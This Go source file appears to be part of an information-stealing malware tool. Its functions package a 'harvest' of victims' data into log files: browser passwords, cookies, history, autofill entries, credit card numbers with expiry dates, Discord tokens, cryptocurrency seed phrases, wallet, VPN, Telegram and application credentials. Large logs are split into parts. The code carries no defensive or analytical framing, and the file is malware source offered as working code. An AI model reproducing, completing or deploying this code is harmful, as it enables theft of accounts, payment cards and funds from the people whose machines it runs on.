package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"strings"

	"recovery/recovery"
)

func buildAllLogFiles(p *harvestPayload) map[string][]byte {
	if p == nil || p.Result == nil {
		return map[string][]byte{
			"summary.txt": []byte(harvestSummary(p)),
		}
	}

	r := p.Result
	out := map[string][]byte{
		"summary.txt": []byte(harvestSummary(p)),
		"README.txt":  []byte(zipReadmeText()),
	}

	if data := passwordsLog(r.Passwords); len(data) > 0 {
		out[zipLogsBrowsers+"passwords.txt"] = data
	}
	if data := cookiesNetscape(p); len(data) > 0 {
		out[zipLogsBrowsers+"cookies.txt"] = data
	}
	if data := historyLog(r.History); len(data) > 0 {
		out[zipLogsBrowsers+"history.txt"] = data
	}
	if data := autofillLog(r.Autofill); len(data) > 0 {
		out[zipLogsBrowsers+"autofill.txt"] = data
	}
	if data := bookmarksLog(r.Bookmarks); len(data) > 0 {
		out[zipLogsBrowsers+"bookmarks.txt"] = data
	}
	if data := creditCardsLog(r.CreditCards); len(data) > 0 {
		out[zipLogsBrowsers+"credit_cards.txt"] = data
	}
	if data := jsonLog("extensions.json", r.Extensions); len(data) > 0 {
		out[zipLogsBrowsers+"extensions.json"] = data
	}

	if data := appCredentialsLog(r.AppCredentials); len(data) > 0 {
		out[zipLogsApps+"app_credentials.txt"] = data
	}
	if data := jsonLog("app_credentials.json", r.AppCredentials); len(data) > 0 {
		out[zipLogsApps+"app_credentials.json"] = data
	}
	if r.Gaming != nil {
		if data := jsonLog("gaming.json", r.Gaming); len(data) > 0 {
			out[zipLogsApps+"gaming.json"] = data
		}
	}
	if r.VPNs != nil {
		if data := jsonLog("vpns.json", r.VPNs); len(data) > 0 {
			out[zipLogsApps+"vpns.json"] = data
		}
	}

	if data := discordTokensLog(r.DiscordTokens); len(data) > 0 {
		out[zipLogsDiscord+"discord_tokens.txt"] = data
	}

	if data := seedsLog(p.Seeds); len(data) > 0 {
		out[zipLogsSeeds+"seeds.txt"] = data
	}

	if data := passwordCandidatesLog(r.PasswordCandidates); len(data) > 0 {
		out[zipLogsKeys+"password_candidates.txt"] = data
	}
	if data := jsonLog("password_candidates.json", r.PasswordCandidates); len(data) > 0 {
		out[zipLogsKeys+"password_candidates.json"] = data
	}
	if data := jsonLog("keys.json", r.Keys); len(data) > 0 {
		out[zipLogsKeys+"keys.json"] = data
	}

	if data := jsonLog("wallets.json", r.Wallets); len(data) > 0 {
		out[zipLogsMeta+"wallets.json"] = data
	}
	if data := jsonLog("files.json", r.Files); len(data) > 0 {
		out[zipLogsMeta+"files.json"] = data
	}
	if data := jsonLog("telegram.json", r.Telegram); len(data) > 0 {
		out[zipLogsMeta+"telegram.json"] = data
	}
	if data, err := json.MarshalIndent(p, "", "  "); err == nil && len(data) > 0 {
		out[zipLogsMeta+"harvest.json"] = data
	}
	return out
}

func appCredentialsLog(rows []recovery.AppCredentialResult) []byte {
	if len(rows) == 0 {
		return nil
	}
	var b bytes.Buffer
	for i, row := range rows {
		if i > 0 {
			b.WriteString("\n")
		}
		b.WriteString("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
		fmt.Fprintf(&b, "Application: %s\n", row.Application)
		if row.Host != "" {
			fmt.Fprintf(&b, "Host: %s\n", row.Host)
		}
		if row.Port > 0 {
			fmt.Fprintf(&b, "Port: %d\n", row.Port)
		}
		if row.Username != "" {
			fmt.Fprintf(&b, "Username: %s\n", row.Username)
		}
		if row.Password != "" {
			fmt.Fprintf(&b, "Password: %s\n", row.Password)
		}
		if row.Protocol != "" {
			fmt.Fprintf(&b, "Protocol: %s\n", row.Protocol)
		}
		if row.Extra != "" {
			fmt.Fprintf(&b, "Extra: %s\n", row.Extra)
		}
	}
	return b.Bytes()
}

func passwordCandidatesLog(rows []recovery.PasswordCandidateResult) []byte {
	if len(rows) == 0 {
		return nil
	}
	var b bytes.Buffer
	for i, row := range rows {
		if i > 0 {
			b.WriteString("\n")
		}
		b.WriteString("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
		fmt.Fprintf(&b, "Source: %s\n", row.Source)
		if row.Detail != "" {
			fmt.Fprintf(&b, "Detail: %s\n", row.Detail)
		}
		fmt.Fprintf(&b, "Password: %s\n", row.Password)
	}
	return b.Bytes()
}

func passwordsLog(rows []recovery.PasswordResult) []byte {
	if len(rows) == 0 {
		return nil
	}
	var b bytes.Buffer
	for i, row := range rows {
		if i > 0 {
			b.WriteString("\n")
		}
		b.WriteString("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
		fmt.Fprintf(&b, "Browser: %s | Profile: %s\n", row.Browser, row.Profile)
		fmt.Fprintf(&b, "URL: %s\n", row.URL)
		fmt.Fprintf(&b, "Username: %s\n", row.Username)
		fmt.Fprintf(&b, "Password: %s\n", row.Password)
	}
	return b.Bytes()
}

func historyLog(rows []recovery.HistoryResult) []byte {
	if len(rows) == 0 {
		return nil
	}
	var b bytes.Buffer
	for i, row := range rows {
		if i > 0 {
			b.WriteString("\n---\n")
		}
		fmt.Fprintf(&b, "Browser: %s | Profile: %s | Visits: %d\n", row.Browser, row.Profile, row.VisitCount)
		if row.Title != "" {
			fmt.Fprintf(&b, "Title: %s\n", row.Title)
		}
		fmt.Fprintf(&b, "URL: %s\n", row.URL)
		if row.LastVisitTime > 0 {
			fmt.Fprintf(&b, "Last visit: %d\n", row.LastVisitTime)
		}
	}
	return b.Bytes()
}

func autofillLog(rows []recovery.AutofillResult) []byte {
	if len(rows) == 0 {
		return nil
	}
	var b bytes.Buffer
	for i, row := range rows {
		if i > 0 {
			b.WriteString("\n")
		}
		fmt.Fprintf(&b, "Browser: %s | Profile: %s\n", row.Browser, row.Profile)
		fmt.Fprintf(&b, "Field: %s\n", row.Name)
		fmt.Fprintf(&b, "Value: %s\n", row.Value)
	}
	return b.Bytes()
}

func bookmarksLog(rows []recovery.BookmarkResult) []byte {
	if len(rows) == 0 {
		return nil
	}
	var b bytes.Buffer
	for i, row := range rows {
		if i > 0 {
			b.WriteString("\n")
		}
		fmt.Fprintf(&b, "Browser: %s | Profile: %s\n", row.Browser, row.Profile)
		if row.Name != "" {
			fmt.Fprintf(&b, "Name: %s\n", row.Name)
		}
		fmt.Fprintf(&b, "URL: %s\n", row.URL)
	}
	return b.Bytes()
}

func creditCardsLog(rows []recovery.CreditCardResult) []byte {
	if len(rows) == 0 {
		return nil
	}
	var b bytes.Buffer
	for i, row := range rows {
		if i > 0 {
			b.WriteString("\n")
		}
		fmt.Fprintf(&b, "Browser: %s | Profile: %s\n", row.Browser, row.Profile)
		if row.NameOnCard != "" {
			fmt.Fprintf(&b, "Name: %s\n", row.NameOnCard)
		}
		fmt.Fprintf(&b, "Number: %s\n", row.CardNumber)
		fmt.Fprintf(&b, "Expires: %02d/%d\n", row.ExpirationMonth, row.ExpirationYear)
		if row.Nickname != "" {
			fmt.Fprintf(&b, "Nickname: %s\n", row.Nickname)
		}
	}
	return b.Bytes()
}

func discordTokensLog(rows []recovery.DiscordTokenResult) []byte {
	if len(rows) == 0 {
		return nil
	}
	var b bytes.Buffer
	for i, row := range rows {
		if i > 0 {
			b.WriteString("\n")
		}
		fmt.Fprintf(&b, "Source: %s\n", row.Source)
		fmt.Fprintf(&b, "Token: %s\n", row.Token)
	}
	return b.Bytes()
}

func seedsLog(rows []recovery.SeedResult) []byte {
	if len(rows) == 0 {
		return nil
	}
	var b bytes.Buffer
	for i, row := range rows {
		if i > 0 {
			b.WriteString("\n---\n")
		}
		fmt.Fprintf(&b, "Source: %s\n", row.Source)
		if row.Path != "" {
			fmt.Fprintf(&b, "Path: %s\n", row.Path)
		}
		fmt.Fprintf(&b, "Words: %d\n", row.Words)
		fmt.Fprintf(&b, "Phrase: %s\n", row.Phrase)
	}
	return b.Bytes()
}

func jsonLog(name string, v any) []byte {
	if v == nil {
		return nil
	}
	data, err := json.MarshalIndent(v, "", "  ")
	if err != nil || len(data) == 0 || string(data) == "null" {
		return nil
	}
	_ = name
	return data
}

func expandLargeLogParts(parts map[string][]byte, maxPart int) map[string][]byte {
	if maxPart <= 0 {
		return parts
	}
	out := make(map[string][]byte, len(parts))
	for name, data := range parts {
		if len(data) <= maxPart {
			out[name] = data
			continue
		}
		chunks := splitBytesBySize(data, maxPart)
		base, ext := splitFilename(name)
		for i, chunk := range chunks {
			chunkName := fmt.Sprintf("%s-part%d%s", base, i+1, ext)
			out[chunkName] = chunk
		}
	}
	return out
}

func splitFilename(name string) (base, ext string) {
	dot := strings.LastIndex(name, ".")
	if dot <= 0 {
		return name, ""
	}
	return name[:dot], name[dot:]
}